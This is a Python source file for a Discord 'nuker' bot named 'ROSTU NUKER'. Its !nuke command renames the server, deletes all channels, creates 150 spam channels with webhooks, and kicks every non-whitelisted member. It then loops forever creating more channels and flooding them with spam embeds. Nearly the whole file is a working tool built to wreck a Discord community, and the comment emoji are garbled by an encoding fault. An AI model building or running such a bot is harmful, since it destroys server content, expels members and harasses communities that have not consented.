import discord
import asyncio
import functools
import random
import os
from discord.ext import commands
from config import BOT_TOKEN, SERVER_NAME, CHANNEL_NAME, WEBHOOK_NAME, SPAM_MESSAGE, WHITELISTED_USERS

# 鉁� Start Message
os.system("cls" if os.name == "nt" else "clear")
print("\n" + "="*50)
print("      R O S T U   N U K E R      ")
print("="*50 + "\n")

intents = discord.Intents.default()
intents.members = True  
bot = commands.Bot(command_prefix="!", intents=intents)

# 鉁� Custom Decorator
def my_command(name=None):
    def decorator(func):
        @functools.wraps(func)
        async def wrapper(*args, **kwargs):
            return await func(*args, **kwargs)

        wrapper.__is_command__ = True
        return commands.command(name=name)(wrapper)

    return decorator

@my_command(name="nuke")
@commands.has_permissions(manage_webhooks=True, manage_channels=True, kick_members=True, manage_guild=True)
async def nuke(ctx):
    guild = ctx.guild
    print("\n馃殌 Starting Nuke Process...\n")

    # 鉁� Step 1: Server Name Change
    await guild.edit(name=SERVER_NAME)
    print(f"鉁� Server Name Changed to '{SERVER_NAME}'")

    # 鉁� Step 2: Delete Old Channels
    delete_tasks = [channel.delete() for channel in guild.channels]
    await asyncio.gather(*delete_tasks)
    print("鉁� All Old Channels Deleted!")

    # 鉁� Step 3: Create 150 Channels in 10 Sec
    channels = []
    for _ in range(150):
        channel = await guild.create_text_channel(CHANNEL_NAME)
        channels.append(channel)

    print(f"鉁� 150 Channels Created Successfully!")

    # 鉁� Step 4: Create Webhooks in Each Channel
    webhooks = []
    for channel in channels:
        try:
            webhook = await channel.create_webhook(name=WEBHOOK_NAME)
            webhooks.append(webhook)
        except Exception as e:
            print(f"鈿狅笍 Webhook Creation Failed: {e}")

    print(f"鉁� {len(webhooks)} Webhooks Created!")

    # 鉁� Step 5: Kick All Non-Whitelisted Members
    print("鈿狅笍 Waiting 10 sec before kicking members...")
    await asyncio.sleep(10)
    
    kick_tasks = [
        member.kick(reason="Nuke command executed") 
        for member in guild.members 
        if not member.bot and member.id not in WHITELISTED_USERS
    ]
    
    await asyncio.gather(*kick_tasks)
    print("鉁� All Non-Whitelisted Members Kicked!")

    # 鉁� Step 6: Start Infinite Channel Creation & Spam
    print("鈿狅笍 Starting Infinite Channel Creation & Spam...")

    async def create_channels():
        while True:
            try:
                channel = await guild.create_text_channel(CHANNEL_NAME)
                webhook = await channel.create_webhook(name=WEBHOOK_NAME)
                webhooks.append(webhook)
            except Exception as e:
                print(f"鈿狅笍 Error creating channel/webhook: {e}")
            await asyncio.sleep(0.5)

    async def spam_webhooks():
        while True:
            try:
                embed = discord.Embed(
                    title="馃敟 Spam Alert!",
                    description=SPAM_MESSAGE,
                    color=random.choice([discord.Color.red(), discord.Color.blue(), discord.Color.green()])
                )
                embed.add_field(name="馃寪 Website", value="[Click Here](https://example.com)", inline=False)
                embed.add_field(name="馃挰 Message", value="This is a random spam message!", inline=False)
                embed.set_footer(text=f"Sent by SpamBot | {ctx.guild.name}")
                embed.timestamp = discord.utils.utcnow()

                for webhook in webhooks:
                    await webhook.send(embed=embed, username="SpamBot")

            except Exception as e:
                print(f"鈿狅笍 Error spamming webhook: {e}")
            await asyncio.sleep(0.5)

    # 鉁� Start Continuous Processes
    asyncio.create_task(create_channels())
    asyncio.create_task(spam_webhooks())

    print("\n馃幆 **Nuke Process Completed!**\n")
    print("鈿狅笍 Bot is still running infinite spam & channel creation!")

bot.add_command(nuke)

bot.run(BOT_TOKEN)